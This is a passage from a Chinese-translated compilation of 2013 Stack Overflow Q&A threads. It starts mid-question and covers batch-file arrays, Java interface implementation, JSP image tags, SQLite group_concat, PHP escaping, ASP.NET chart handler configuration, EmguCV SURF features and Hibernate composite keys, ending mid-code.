几天来我一直试图弄清楚这一点..我无法绕过它。我之前已经为命令做了很多，但这让我很难过。我的浏览器历史记录充满了谷歌搜索，似乎人们会询问任何类型的文件。如果我确实找到了与这个问题很接近的任何东西，它总是被要求使用不同的编程语言。我的大脑被炸了。这甚至可能吗？请提前帮助和感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T18:41:49.407

尽管马丁的回答描述了如何*创建*唯一变量，但他没有解释如何*阅读*它们。当您谈论“将每个答案保存为唯一变量”时，此处涉及的概念是*ARRAY*。您需要使用延迟扩展来获取唯一变量（“数组元素”）的值；有关更多详细信息，请键入`set /?`并查找“延迟扩展”。您可以在这篇文章中阅读有关批处理文件中数组管理的详细说明：[cmd.exe (batch) 脚本中的数组、链表和其他数据结构](https://stackoverflow.com/questions/10166386/arrays-linked-lists-and-other-data-structures-in-cmd-exe-batch-script/10167990#10167990)

```
@echo off
setlocal EnableDelayedExpansion

set /p howmany=How many files do you want to add?
for /L %%i in (1,1,%howmany%) do (
   set /p inputfilename[%%i]=what is the name of the file you want to add?
)

rem Process array elements (just show them in this case)
for /L %%i in (1,1,%howmany%) do (
   echo %%i- !inputfilename[%%i]!
) 
```

下面的示例可以帮助您以更简单的方式理解阵列管理：

```
@echo off
setlocal EnableDelayedExpansion

rem Create an array of ordinal terms
set i=0
for %%a in (first second third fourth fifth sixth) do (
   set /A i+=1
   set term[!i!]=%%a
)
rem Previous FOR is equivalent to: set term[1]=first, set term[2]=second, ...

set /p howmany=How many files do you want to add?
for /L %%i in (1,1,%howmany%) do (
   set /p inputfilename[%%i]=what is the name of the !term[%%i]! file you want to add?
)

rem Process array elements (just show them in this case)
for /L %%i in (1,1,%howmany%) do (
   echo The !term[%%i]! file is !inputfilename[%%i]!
) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T11:31:41.100

无论如何回答你的实际问题：

```
@echo off

set /p howmany=How many files do you want to add? 

for /L %%i in (1, 1, %howmany%) do (
set /p inputfilename%%i=what is the name of the first file you want to add? 
)

rem Output the variables to check
set inputfilename 
```

输出：

```
How many files do you want to add? 3
what is the name of the first file you want to add? first
what is the name of the first file you want to add? second
what is the name of the first file you want to add? third
inputfilename1=first
inputfilename2=second
inputfilename3=third 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:21:14.857

你需要那些 N 个变量来做什么？我猜您需要将文件名列表传递给某些脚本/命令行应用程序。

那么，用（空格？-）分隔的文件名列表来处理一个变量不是更好吗？

喜欢：

```
@echo off

set /p howmany=How many files do you want to add?

set list=

:NEXT

if %howmany% leq 0 goto END

set /p inputfilename=what is the name of the first file you want to add? 

set list=%list% "%inputfilename%"
set /a howmany=%howmany% - 1
goto NEXT

:END

echo %list% 
```

# java - 无法从接口实现子类中的方法

> ID：15998164
> 
> 赞同：0
> 
> 时间：2013-04-14T10:42:00.620
> 
> 标签：java, interface, polymorphism

我知道这是家庭作业，所以这听起来很奇怪。现在我正试图摆脱一个编译错误，说池必须实现抽象方法。Pool 由 BackYard 接口实现，而 deck 是 pool 的子类， bollards 是 deck 的子类。我不允许更改驱动程序类中显示输出方法中的代码，也不允许更改甲板或系船柱中的代码。编译器一直坚持要我重新编码池中的所有子类方法或使池抽象，我也不能这样做。我到底需要修复什么。如果我真的需要编写 Backyard 接口中的所有 get 方法，也请告诉我

这是驱动程序类：

```
public class YardOrders 
{
        //Constants
        final static int POOL_ONLY = 1;
        final static int POOL_N_DECK=2;
        final static int POOL_DECK_N_BOLLARD=3;
        final static int DISPLAY_ORDERS=4;
      final static int DEFAULT_INT=0;

      //Methods
        public static void main(String[] args) 
        {
            int numberOfOrders=DEFAULT_INT;
            BackYard backYard[] = new BackYard[100];
            int selection = DEFAULT_INT;
             do
             {
                 selection = Integer.parseInt(JOptionPane.showInputDialog(null,       
                            "Options:\nEnter "+ POOL_ONLY +" for a pool.\n" +                               
                            "Enter "+ POOL_N_DECK +
                            " for a pool and a concrete " +
                            "deck surrounding the pool.\n"+
                            "Enter "+POOL_DECK_N_BOLLARD+" for a pool," +
                            " deck, and bollards.\n"+
                            "Enter "+DISPLAY_ORDERS+" to display orders and exit.",
                            "Pool Options", JOptionPane.PLAIN_MESSAGE));
                    if(selection > DEFAULT_INT && selection < DISPLAY_ORDERS)
                    {

                            getPoolInput(backYard,numberOfOrders,selection);
                            numberOfOrders++;
                            System.out.println(numberOfOrders);
                    }
                    else if(selection==DISPLAY_ORDERS)
                    {
                        displayOrders(backYard,numberOfOrders);
                        System.out.println(numberOfOrders);
                        System.exit(DEFAULT_INT);
                    }
                    else
                    {
                        JOptionPane.showMessageDialog(null,"Invalid input. Values" +
                    " must be between 1 and 4.");
                    }
             }while(selection != DISPLAY_ORDERS);                                                   
        }     

        private static void getPoolInput(BackYard backYard[],int numberOfOrders,int selection)
        {
            //Pool attributes
            String lastName = JOptionPane.showInputDialog(null,
                    "Enter last name.\n","Last Name",
                    JOptionPane.PLAIN_MESSAGE);

            String firstName = JOptionPane.showInputDialog(null,
                    "Enter first name.","First Name",
                    JOptionPane.PLAIN_MESSAGE);

            double poolDepth = Double.parseDouble(
                    JOptionPane.showInputDialog(null,
                    "Enter pool depth in inches.","Pool Depth",
                    JOptionPane.PLAIN_MESSAGE)); //In inches.

            double poolDiameter = Double.parseDouble(
                    JOptionPane.showInputDialog(null,
                    "Enter pool diameter in feet.","Pool Diameter",
                    JOptionPane.PLAIN_MESSAGE));//In feet.
            if(selection == POOL_ONLY)
            {
              //Pool instantiation.

                backYard[numberOfOrders]= new Pool(lastName,firstName,
                            poolDepth,poolDiameter);
            }
            else
            {
                getDeckInput(backYard, 
                                numberOfOrders,selection,
                                        lastName,firstName,
                                        poolDepth, poolDiameter);
            }

        }//End of method

        private static void getDeckInput(BackYard[] backYard, 
                                                                         int numberOfOrders, int selection,
                                                                        String lastName, String firstName,
                                                                         double poolDepth, double poolDiameter)
        {
            //Deck attributes
            double deckLength=Double.parseDouble(
                    JOptionPane.showInputDialog(null,
                    "Enter deck length in feet.","Deck Length",
                    JOptionPane.PLAIN_MESSAGE));

            double deckWidth= Double.parseDouble(
                    JOptionPane.showInputDialog(null,
                    "Enter deck width in feet.","Deck Width",
                    JOptionPane.PLAIN_MESSAGE));
            if(selection==POOL_N_DECK)
            {

                backYard[numberOfOrders]= new Deck(lastName,firstName,
                                                                    poolDepth,poolDiameter,
                                                             deckLength,deckWidth);

            }
            else
            {
                getBollardInput(lastName,firstName,
                                                poolDepth,poolDiameter,
                                                deckLength,deckWidth);
            }
        }
        public static void getBollardInput(String lastName, String firstName,
                                                                         double poolDepth, double poolDiameter,
                                                                         double deckLength, double deckWidth)
        {
            //Bollard attributes
            double bollardHeight=Double.parseDouble(
                JOptionPane.showInputDialog(null,
                "Enter bollard height in inches.","Bollard Height",
                JOptionPane.PLAIN_MESSAGE));

            double bollardDiameter=Double.parseDouble(
                JOptionPane.showInputDialog(null,
                "Enter bollard diameter in incehs.","Bollard Diameter",
                JOptionPane.PLAIN_MESSAGE));

            int numberOfBollards=Integer.parseInt(
                JOptionPane.showInputDialog(null,
                "Enter the number of bollards.","Number of bollards",
                JOptionPane.PLAIN_MESSAGE));

            //Bollard instantiation
            Bollards bollards= new Bollards(lastName,firstName,
                    poolDepth,poolDiameter,
                    deckLength,deckWidth,
                    bollardHeight, bollardDiameter,
                    numberOfBollards);
        }

        private static void displayOrders(BackYard[] orders, int numberOfOrders)
        {
            DecimalFormat dec3 = new DecimalFormat("0.000");
            String divider = "******************************************************" +
                                             "***********\n";
            JTextArea textOut = new JTextArea(divider, 10, 30);
            JScrollPane scroller = new JScrollPane(textOut);

            for(int sub = 0; sub < numberOfOrders; sub++)
            {
                textOut.append("Customer Name: " + orders[sub].getLastName() + ", ");
                textOut.append(orders[sub].getFirstName() + "\n");
                textOut.append("Pool Depth:" +
                                            dec3.format(orders[sub].getInsideDepth()) + "\n");
                textOut.append("Pool Diameter: "+
                                            dec3.format(orders[sub].getInsideDiameter()) + "\n");
                textOut.append("Deck Width: " +
                                            dec3.format(orders[sub].getDeckWidth()) + "\n");
                textOut.append("Deck Length: " +
                                                dec3.format(orders[sub].getDeckLength()) + "\n");
                textOut.append("Number of Bollards Ordered: " +
                                                orders[sub].getNumberOfBollards() + "\n");
                textOut.append("Height of Bollards: " +
                                                dec3.format(orders[sub].getBollardHeight()) + "\n");
                textOut.append("Diameter of Bollards: " +
                                            dec3.format(orders[sub].getBollardDiameter()) + "\n");
                textOut.append("Cubic Yards of Concrete Needed: " +
                                            dec3.format(orders[sub].getConcreteVolume()) + "\n");
                textOut.append(divider);
            } // end for loop
            JOptionPane.showMessageDialog(null, scroller, "Orders Placed",
                                                                        JOptionPane.PLAIN_MESSAGE);
        } // end method DisplayOrders*/

} 
```

这是后院界面：

```
public interface BackYard 
{
    //Universal constants 
        public static final int CU_IN_TO_CU_YD = 46656;
        public static final int FT_TO_IN = 12;
        public static final double DENSITY = 3.75; // in inches

        //Pool constants. 
        public static final String DEFAULT_NAME = "Unknown"; 
        public static final int DEFAULT_DIAM_DEPTH = 0;
        public static final int STANDARD_DEPTH = 24; // in inches
        public static final int STANDARD_DIAMETER = 6; // in feet
        public static final int MIN_DEPTH = 10; // in inches
        public static final int MAX_DEPTH = 72; // in inches
        public static final int MIN_DIAMETER = 3; // in feet
        public static final int MAX_DIAMETER = 25; // in feet

        //Deck constants
        public final static double MAX_DECK_LENGTH = 50.0; // in feet
        public static final double MAX_DECK_WIDTH = 50.0;  // in feet
        public static final int DEFAULT_WIDTH_AND_LENGTH = 0;

      //Bollard constants
        public static final double MAX_BOLLARD_HEIGHT = 60.0;  // in inches
        public static final double MIN_BOLLARD_HEIGHT = 24.0;  // in inches
        public static final double MAX_BOLLARD_DIAMETER = 18.0;  // in inches
        public static final double MIN_BOLLARD_DIAMETER = 3.0;  // in inches
        public static final int MIN_NUMBER_OF_BOLLARDS = 4; // units

        //Methods.
        public abstract String getLastName();
        public abstract String getFirstName();
        public abstract double getInsideDepth();
        public abstract double getInsideDiameter();
        public abstract  double getDeckWidth();
        public abstract double getDeckLength();
      public abstract int getNumberOfBollards();
      public abstract double getBollardHeight();
      public abstract double getBollardDiameter();
        public abstract double getConcreteVolume();
} 
```

这是泳池课

```
public class Pool implements BackYard
{
    // instance variable(s)
    private double insideDiameter; // in feet
    private double insideDepth; // in inches
    private String lastName;
    private String firstName;

    // class variable(s)
    public static int numberOfOrders;

    // Zero argument constructor.  Sets instance variables to default values
    public Pool()   
    {
        setInsideDiameter(DEFAULT_DIAM_DEPTH);
        setInsideDepth(DEFAULT_DIAM_DEPTH);
        setLastName(DEFAULT_NAME);
        setFirstName(DEFAULT_NAME);
    }

    // Two parameter constructor.  
    // Sets names to input values and measurements to standard values
    public Pool(String lastNameIn, String firstNameIn)
    {
        setInsideDiameter(STANDARD_DIAMETER);
        setInsideDepth(STANDARD_DEPTH);
        setLastName(lastNameIn);
        setFirstName(firstNameIn);
        numberOfOrders++;
    }   

    // Three parameter constructor.  
    // Sets names and depth to input values and diameter to standard value
    public Pool(String lastNameIn, String firstNameIn, double depthIn)
    {
        setInsideDiameter(STANDARD_DIAMETER);
        setInsideDepth(depthIn);
        setLastName(lastNameIn);
        setFirstName(firstNameIn);
        numberOfOrders++;
    }   

    // Three parameter constructor.  
    // Sets all instance variables to input values
    public Pool(String lastNameIn, String firstNameIn, double depthIn, 
        double diameterIn)
    {
        setInsideDiameter(diameterIn);
        setInsideDepth(depthIn);
        setLastName(lastNameIn);
        setFirstName(firstNameIn);
        numberOfOrders++;
    }   

    // returns depth
    public double getInsideDepth()
    {
        return insideDepth;
    }

    // validates input and sets depth
    public void setInsideDepth(double inDepth)
    {
        insideDepth =  ((inDepth >= MIN_DEPTH && 
                    inDepth <= MAX_DEPTH) ? inDepth : DEFAULT_DIAM_DEPTH);
    }

    // returns diameter
    public double getInsideDiameter()
    {
        return insideDiameter;
    }

    // validates diameter and sets diameter
    public void setInsideDiameter(double inDiameter)
    {
        insideDiameter = ((inDiameter >= MIN_DIAMETER && 
                    inDiameter <= MAX_DIAMETER) ? inDiameter : DEFAULT_DIAM_DEPTH);
    }

    // validates and sets last name
    public void setLastName(String lastNameIn)
    {
        lastName = ((lastNameIn.length()) > 0 ? lastNameIn : DEFAULT_NAME);
    }

    // returns last name
    public String getLastName()
    {
        return lastName;
    }

    // validates and sets first name
    public void setFirstName(String firstNameIn)
    {
        firstName = ((firstNameIn.length()) > 0 ? firstNameIn : DEFAULT_NAME);
    }

    // returns first name
    public String getFirstName()
    {
        return firstName;
    }

    // calculates total concrete necessary in cubic yards and returns that value
    @Override
    public double getConcreteVolume()
    {
        if(getInsideDiameter() == 0 || getInsideDepth() == 0)
            return 0.000;
        else
            return (getCylinderVolume(getInsideDiameter() * FT_TO_IN + DENSITY + 
                         DENSITY, getInsideDepth() + DENSITY) / CU_IN_TO_CU_YD) -
                       (getCylinderVolume(getInsideDiameter() * FT_TO_IN, 
                         getInsideDepth())) / CU_IN_TO_CU_YD;
    }

    // private utility method used to calculate the volume of a cylinder
    public double getCylinderVolume(double diameter, double height)
    {
        return (Math.PI * Math.pow(diameter / 2.0, 2)) * height;
    }
} //end class Pool 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-14T11:10:38.220

以前签过合同吗？

![在此处输入图像描述](https://i.stack.imgur.com/ufVIN.png)

这段代码：

```
public class Pool implements BackYard 
```

就像一个。就像**Pool**对**Backyard**说：“*嘿，Backyard，我正在签署一份合同，保证我将为你拥有的所有方法创建代码。* ”

## 但普尔违反了合同。

警察（编译器）发现了它并说：**伙计，或者让你的孩子去做。**

要么您自己完成合同（即为 Backyard 中提到的所有方法创建代码），要么让您的后代完成它（子类将是添加代码的子类）。你有点“受到惩罚”——让你处于抽象状态，直到承诺完成。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T10:49:33.903

第一个具体类必须实现其超类型的所有抽象方法。在您的情况下，您可以将 Pool 抽象化，全部实现来自尚未实现的超类型的所有抽象方法。

换句话说，如果你不允许抽象类 Pool 有抽象方法，那么你的库的客户端可以做

```
Pool p = new Pool();
p.getBollardHeight(); 
```

这是行不通的，因为这个方法没有实现。另一方面，如果您将 Pool 抽象化，则不允许实例化它，并且不会发生上述问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T10:54:14.510

`BackYard`您必须在`Pool`类中创建您看到的所有方法

# html - 在 JSP 中使用 img-tag

> ID：15998166
> 
> 赞同：1
> 
> 时间：2013-04-14T10:42:14.073
> 
> 标签：html, image, jsp

我正在尝试在我的网页上显示一个使用 jsp/html 制作的图像。当我使用以下代码时，我收到一条错误消息：

> 元素 img 上的属性 src 的“错误值”：PATH 中的 DOUBLE_WHITESPACE。

```
<img src="<%=item.getPicture()%>" width="100"> 
```

该函数`getPicture()`返回一个指向我需要的图像的 URL。

为什么这不起作用？

# sql - SQLite 查询聚合

> ID：15998167
> 
> 赞同：1
> 
> 时间：2013-04-14T10:42:14.197
> 
> 标签：sql, sqlite

我在 SQLite 表中有两列数据：`users`和`URL`. 我正在尝试构建一个返回`users`特定`URL`. 我正在尝试以下操作：

```
SELECT url, COUNT(url) as RESULT 
FROM bookmarks 
GROUP BY url 
order by RESULT desc
limit 10; 
```

这个查询很接近，但我只返回一个用户，而不是给定书签 URL 的所有用户的聚合。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T10:59:56.510

使用[group_concat()](http://www.sqlite.org/lang_aggfunc.html)获取每个用户的列表`url`

```
SELECT url, 
       COUNT(users) as RESULT, 
       group_concat(users) as user_list
FROM bookmarks 
GROUP BY url 
order by RESULT desc 
limit 10; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:51:32.973

是的，更多详情：

```
SELECT ... GROUP_CONCAT(users ORDER BY users ASC SEPARATOR ', ') AS user_list
FROM ... 
```

# php - PHP+HTML 语法

> ID：15998168
> 
> 赞同：0
> 
> 时间：2013-04-14T10:42:15.080
> 
> 标签：php, html, escaping

我正在尝试让一个网页显示四个 div，这些 div 将包含一个 img 和一个描述。我想使用循环，因为我将有许多包含这些 div 的其他页面。这是我现在使用的代码：

```
for ($i=0;$i<4;$i++)
{
    echo '<div class="item">
    <img src="IMGs\\' . $items[$i]["ImgFilename"] . '" />
    <h6 class="panel">Description</h6>
    </div>';
} 
```

我相信问题在于我没有以正确的方式逃避。我一直在寻找一段时间，但找不到合适的组合。文件存储在 IMGs\file.jpg 中，其中 file.jpg 是从数组中提取的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T10:46:48.533

你的逃跑对我来说似乎很好。但是，我认为问题出在双反斜杠上。例如，删除并将其`\\`替换为`/`因此该行变为：

`<img src="IMGs/' . $items[$i]["ImgFilename"] . '" />`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T10:46:40.223

你不需要逃避这个。改变这个：

```
<img src="IMGs\\' . $items[$i]["ImgFilename"] . '" /> 
```

至`<img src="IMGs/' . $items[$i]["ImgFilename"] . '" />`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T10:47:06.483

您可以根据需要通过闯入/退出 PHP 来更好地布置代码，这是一个简单的示例：-

```
<?php for($index = 0; $index < 4; $index++): ?>
    <div class="item">
        <img src="IMGs/<?php echo $items[$index]["ImgFilename"]; ?>" />
        <h6 class="panel">Description</h6>
    </div>
<?php endfor; ?> 
```

# c# - 执行 ChartImg.axd 的子请求时出错。这不是重复的

> ID：15998171
> 
> 赞同：6
> 
> 时间：2013-04-14T10:42:40.457
> 
> 标签：c#, asp.net, .net, visual-studio, charts

我已经尝试了这个线程上的所有解决方案： [.NET 3.5 图表控件异常：执行 ChartImg.axd 的子请求时出错](https://stackoverflow.com/questions/302820/net-3-5-chart-controls-exception-error-executing-child-request-for-chartimg-ax)

我添加了

```
<add
    path="ChartImg.axd" 
    verb="GET,HEAD" 
    type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" 
    validate="false" /> 
```

该部分的代码，`httpHandlers`但它仍然不起作用。

我还补充说：

```
<appSettings>
    <add key="ChartImageHandler" value="storage=file;timeout=20;dir=c:\TempImageFiles\;" />
</appSettings>

<httpHandlers>
...
    <add path="ChartImg.axd" verb="GET,HEAD" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" validate="false" />
...
</httpHandlers>

<handlers>
...
    <add name="ChartImageHandler" preCondition="integratedMode" verb="GET,HEAD" path="ChartImg.axd" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />

...
</handlers> 
```

但是经过一段时间将这些标签放置在配置文件中的正确位置之后，我得到了同样的错误。

这是我目前的配置文件：

```
<?xml version="1.0"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>

  <appSettings>
    <add key="ChartImageHandler" value="storage=file;timeout=20;dir=c:\TempImageFiles\;" />
  </appSettings>
  <system.web>
    <httpHandlers>

      <add path="ChartImg.axd" verb="GET,HEAD" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" validate="false" />

    </httpHandlers>

    <!--<pages>
      <controls>
        <add tagPrefix="artem" namespace="Artem.Google.UI" assembly="Artem.Google"/>
      </controls>
    </pages>-->
    <compilation debug="true" targetFramework="4.5">

      <assemblies> 
        <add assembly="System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>  

      </assemblies>

    </compilation>

    <httpRuntime targetFramework="4.5"/>
  </system.web>
  <system.webServer>
    <validation validateIntegratedModeConfiguration="false"/>
  </system.webServer>
</configuration> 
```

我已经坚持了两个小时无法让任何工作。我正在使用 .net 框架 4.5

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-10-22T20:18:28.780

这是我的情况：

*   从 3.5 升级到 4.0
*   它在我的机器上本地编译时工作（64位Win7）
*   发布到 Win2003 服务器时不起作用

我只是想念这个：

```
<system.web><httpHandlers>
  <add path="ChartImg.axd" verb="GET,HEAD,POST" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    validate="false" />
</httpHandlers></system.web> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-09-13T09:53:11.133

我设法解决了这个问题（我正在使用 DotNetNuke，但出现错误“执行 ChartImg.axd 的子请求时出错。”）

我将以下行添加到我的 web.config 文件中

```
<configuration>
  <system.webServer>
    ...
    <handlers>
      ...
      <add name="ChartImageHandler" preCondition="integratedMode" verb="GET,HEAD,POST"
        path="ChartImg.axd" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </handlers>
    <validation validateIntegratedModeConfiguration="false" />
  </system.webServer>
  <system.web>
    <httpHandlers>
      <add path="ChartImg.axd" verb="GET,HEAD,POST" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
        validate="false" />
    </httpHandlers>
    ...
  </system.web>

</configuration> 
```

在 DotNetNuke 中，如果您想在安装过程中从模块更新配置文件，请按照[这篇文章](http://www.dnnsoftware.com/forums/forumid/205/threadid/432396/scope/posts)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T13:41:00.050

对于其他无法解决此问题的人。

1.  我去了这里： [http ://forums.asp.net/t/1843074.aspx/1](http://forums.asp.net/t/1843074.aspx/1)

2.  我将此代码复制并粘贴到 web.config 文件中相应的部分。

3.  然后，我在使用图表控件运行页面时从 IIS 8 收到此错误消息：

    HTTP 错误 500.23 - 内部服务器错误 检测到不适用于集成托管管道模式的 ASP.NET 设置。

4.  该消息还包含建议：

> 您可以尝试的事情：将配置迁移到 system.webServer/handlers 部分。您可以手动执行此操作，也可以从命令行使用 AppCmd。例如，从 IIS Express 安装目录，运行 appcmd migrate config "Default Web Site/"。使用 AppCmd 迁移您的应用程序将使其能够在集成模式下工作。它将继续在经典模式和以前版本的 IIS 上工作。如果您确定可以忽略此错误，可以通过将 system.webServer/validation@validateIntegratedModeConfiguration 设置为 false 来禁用它。或者，将应用程序切换到经典模式应用程序池。例如，从 IIS Express 安装目录，运行 appcmd set app "Default Web Site/" /applicationPool:"Clr4ClassicAppPool"。

其中一项建议是：

> 将应用程序切换到经典模式应用程序池。例如，从 IIS Express 安装目录，运行 appcmd set app "Default Web Site/" /applicationPool:"Clr4ClassicAppPool"。仅当您无法迁移应用程序时才执行此操作。

所以我用谷歌搜索，然后我去了这里：

[如何将 IIS Developer Express 切换到“经典模式”](https://stackoverflow.com/questions/3748466/how-to-switch-iis-developer-express-to-classic-mode)

更改为经典模式的最佳解决方案是：

> 不需要使用 appcmd，最好在项目的设置中更改：
> 
> 单击解决方案资源管理器中的 Web 项目 按 F4 以显示属性页面（不是属性表，而是设置常规内容的更简单的属性窗口）查找“托管管道模式”，将其更改为“经典” '

现在图表控件可以工作了。如果有人有更好的解决方案（例如我不理解的错误中的其他解决方案建议），请随时对这些建议进行更清晰的描述。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-03-09T18:24:36.693

在根 asp:chart 标记中使用以下属性

```
ImageLocation="~/images/temp/ChartPic_#SEQ(300,3)" ImageStorageMode="UseImageLocation" 
```

删除 web.config 中的所有配置。通过上述更改，您将处理保存图表图像而不是图表 api 的位置。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-09-22T08:00:28.847

我在我们的 Windows 2003 服务器上间歇性地收到此错误。我应用了 Michael 解决方案中的 web.config 代码，但它仍然偶尔会崩溃。这就是我修复它的方法：

在 Windows 2003 Server 上进行远程桌面时，我通过以下方式在本地启动了网站`http://localhost/websitename`

该站点在本地工作，并在其他地方开始正常工作。不知道为什么！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-01-29T11:46:14.467

对我有用的解决方案是[此处发布的解决方案](http://forums.asp.net/t/1843074.aspx)

```
<system.web>
//comment this in local IIS7, on host uncomment
<httpHandlers>
<add path="ChartImg.axd" verb="GET,HEAD,POST" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" validate="false" />
    </httpHandlers>
</system.web>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true" />
    <handlers>
      <remove name="ChartImageHandler" />
      <add name="ChartImageHandler" preCondition="integratedMode" verb="GET,HEAD,POST" path="ChartImg.axd" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </handlers>
  </system.webServer> 
```

另外我必须在 appSettings 上添加这个

```
<appSettings>
<add key="ChartImageHandler" value="storage=file;timeout=20;dir=c:\Temp\;" />
</appSettings> 
```

# c# - EmguCv 中的 SURF 特征：如何提取固定数量的特征

> ID：15998172
> 
> 赞同：0
> 
> 时间：2013-04-14T10:42:45.257
> 
> 标签：c#, emgucv, surf

我想训练一个神经网络来对不同类别的灰度图像进行分类。

作为该网络的输入，我想使用 SURF-128 算法提取的特征。以下代码（[EmguCV library 提供的示例的简化](http://www.emgu.com/wiki/index.php/SURF_feature_detector_in_CSharp)）显示了我如何使用 API：

```
SURFDetector surfCPU = new SURFDetector(500, true);
VectorOfKeyPoint observedKeyPoints;

BriefDescriptorExtractor descriptor = new BriefDescriptorExtractor();

observedKeyPoints = surfCPU.DetectKeyPointsRaw(img, null);
Matrix<Byte> observedDescriptors = descriptor.ComputeDescriptorsRaw(img, null, observedKeyPoints); 
```

通过使用以下代码：

```
observedDescriptors.Save(@"SURF.bmp"); 
```

我可以保存一些结果。下图显示了上面的代码提取了不同大小的特征（右边是上一行代码保存的结果）：

![图像测试](https://i.stack.imgur.com/geGo9.png)

我想要的是获得一个固定大小的向量。

如何使用 EmguCV 库为 C# 提供的 API 转换 128 维数组中的通用灰度图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T15:21:35.903

问题解决了。

为了获得描述灰度图像的 128 维数组，其中存储了与固定关键点（例如图像中心）相关的特征，我使用了以下代码：

```
SURFDetector surfCPU = new SURFDetector(400, true);

float x = 30, y = 50; //KeyPoint position
float kpSize = 20;    //KeyPoint size

MKeyPoint[] keyPoints = new MKeyPoint[1];
keyPoints[0] = newMKeyPoint(x, y, kpSize); //This method is written below

ImageFeature<float>[] features = surfCPU.ComputeDescriptors<float>(img, null, keyPoints);

float[] array_of_128_elements = features[0].Descriptor; 
```

* * *

```
private static MKeyPoint newMKeyPoint(float x, float y, float size)
{
    MKeyPoint res = new MKeyPoint();
    res.Size = size;
    res.Point = new PointF(x, y);
    //res.Octave = 0;
    //res.Angle = -1;
    //res.Response = 0;
    //res.ClassId = -1;

    return res;
} 
```

# hibernate - 复合键的休眠解决方案

> ID：15998175
> 
> 赞同：1
> 
> 时间：2013-04-14T10:43:25.197
> 
> 标签：hibernate, jpa

我一直在努力使用休眠创建一个复合键。我找到了这个链接： [如何制作复合主键（java持久性注释）](https://stackoverflow.com/questions/1212058/how-to-make-a-composite-primary-key-java-persistence-annotation?answertab=votes#tab-top)

首先，我尝试了 Tim 接受的解决方案`@NaturalId`。不适合我。

其次，我尝试了 Arthur Ronald FD Garcia 的解决方案。我仍然有一些问题。这是我的代码，与 Arthur Ronald FD Garcia 的解决方案非常相似。

邮箱类：

```
@Entity
public class Mailbox {

    @Id
    @GeneratedValue
    private int mailboxId;
    @Column( unique=true, nullable=false )
    private String name;    
    @Column( unique=true, nullable=false )
    private String employeeId;  
    private String status;
    private Date createdOn;

    @OneToMany(cascade=CascadeType.ALL, mappedBy="joinedMailboxMessageId.mailboxId")
    private List<MailboxMessages> joinedMailboxMessageList = new ArrayList<MailboxMessages>();

    public Mailbox(){}
    public Mailbox(int id)  {this.mailboxId=id;}
    public void addSMail(SMail mail) {
        // Implementation
    }
    //Getters and setters
} 
```

邮件类

```
@Entity
public class SMail {

    @Id
    @GeneratedValue
    private int messageId;

    private Date originDate;
    private String from;
    @ElementCollection
    private List<String> to=new ArrayList<String>();
    @Lob
    private String message;
    private String subject;

    @OneToMany(cascade=CascadeType.ALL, mappedBy="joinedMailboxMessageId.messageId")
    private List<MailboxMessages> joinedMailboxMessageList = new ArrayList<MailboxMessages>();

    public SMail() {}
    public SMail(int messageId) {
        this.messageId=messageId;
    }

    // addMailbox sets up bidirectional relationship
    public void addMailbox(Mailbox mailbox) { // Implementation}
//Getters and setters
} 
```

最后是我的 MailboxMessages 类

```
@Entity
public class MailboxMessages {

    @ManyToOne
    @JoinColumn(name="MAILBOX_ID", insertable=false, updatable=false)
    private Mailbox mailboxId;

    @ManyToOne
    @JoinColumn(name="MESSAGE_ID", insertable=false, updatable=false)
    private SMail messageId;

    private boolean read;
    private boolean deleted;
    private boolean flagged;
    private String priority;
    private Date messageDate;

    @EmbeddedId
    // Implemented as static class - see bellow
    private MailboxMessagesId joinedMailboxMessageId;

    // INNER CLASS: required because this class contains composite id
    @Embeddable
    public static class MailboxMessagesId implements Serializable {

    @ManyToOne
        @JoinColumn(name="MAILBOX_ID")
        private Mailbox mailboxId;

